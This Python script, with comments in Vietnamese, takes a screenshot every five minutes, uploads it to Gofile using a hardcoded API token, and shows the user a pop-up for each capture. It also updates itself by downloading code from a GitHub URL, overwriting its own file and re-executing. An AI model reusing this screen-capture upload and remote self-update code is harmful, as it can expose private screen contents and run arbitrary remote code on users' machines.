import os
import sys
import time
import threading
import requests
import pyautogui
import tkinter as tk
from tkinter import messagebox
from datetime import datetime

# --- THÔNG TIN CẤU HÌNH ---
CURRENT_VERSION = "2.0.1"
VERSION_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/version_v2"
UPDATE_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/monitor_v2.py"
GOFILE_API = "https://upload.gofile.io/uploadfile"
GOFILE_TOKEN = "vc5njCimJvXwoDEtsidgrTWoU9ZW61w6"
FOLDER_ID = "f0211191-7505-4226-b5a1-cbede323189b"

class SystemMonitor:
    def __init__(self):
        self.running = True

    def show_notification(self, message):
        """Hiển thị hộp thoại thông báo mà không làm treo luồng chính"""
        def msg_box():
            root = tk.Tk()
            root.withdraw()  # Ẩn cửa sổ chính của tkinter
            root.attributes("-topmost", True) # Đưa thông báo lên trên cùng
            messagebox.showinfo("Hệ Thống Giám Sát", message)
            root.destroy()
        
        threading.Thread(target=msg_box).start()

    def capture_and_upload(self):
        """Hàm thực hiện chụp màn hình và tải lên định kỳ mỗi 5 phút"""
        while self.running:
            temp_file = ""
            try:
                # 1. Chụp màn hình
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                temp_file = f"SC_{timestamp}.png"
                
                pic = pyautogui.screenshot()
                # Tối ưu dung lượng với quality=80 (Phải convert sang RGB nếu là PNG)
                pic.save(temp_file, optimize=True, quality=80)

                # 2. Upload API Gofile
                with open(temp_file, 'rb') as f:
                    files = {'file': f}
                    data = {
                        'token': GOFILE_TOKEN,
                        'folderId': FOLDER_ID
                    }
                    response = requests.post(GOFILE_API, files=files, data=data, timeout=30)
                
                if response.status_code == 200:
                    # 3. Thông báo cho người dùng
                    time_str = datetime.now().strftime("%H:%M:%S")
                    self.show_notification(f"Đã chụp và lưu màn hình lúc [{time_str}]")
                
            except Exception as e:
                print(f"Lỗi tiến trình Screenshot: {e}")
            
            finally:
                # 4. Xóa tệp tạm sau khi hoàn tất (thành công hoặc lỗi)
                if temp_file and os.path.exists(temp_file):
                    os.remove(temp_file)

            time.sleep(300) # Nghỉ 5 phút

    def auto_update(self):
        """Kiểm tra và tự động cập nhật mã nguồn mỗi 10 phút"""
        while self.running:
            try:
                # Kiểm tra phiên bản mới
                resp = requests.get(VERSION_URL, timeout=15)
                new_version = resp.text.strip()

                if new_version != CURRENT_VERSION:
                    # Tải mã nguồn mới
                    update_resp = requests.get(UPDATE_URL, timeout=30)
                    if update_resp.status_code == 200:
                        # Ghi đè chính file hiện tại
                        with open(__file__, "w", encoding="utf-8") as f:
                            f.write(update_resp.text)
                        
                        # Khởi động lại script để áp dụng bản mới
                        os.execv(sys.executable, [sys.executable] + sys.argv)
                
            except Exception as e:
                print(f"Lỗi kiểm tra cập nhật: {e}")

            time.sleep(600) # Nghỉ 10 phút

    def start(self):
        """Khởi chạy đa luồng"""
        # Luồng 1: Chụp ảnh và Upload
        thread_monitor = threading.Thread(target=self.capture_and_upload, daemon=True)
        # Luồng 2: Tự động cập nhật
        thread_update = threading.Thread(target=self.auto_update, daemon=True)

        thread_monitor.start()
        thread_update.start()

        # Giữ luồng chính không kết thúc
        while self.running:
            time.sleep(1)

if __name__ == "__main__":
    monitor = SystemMonitor()
    monitor.start()
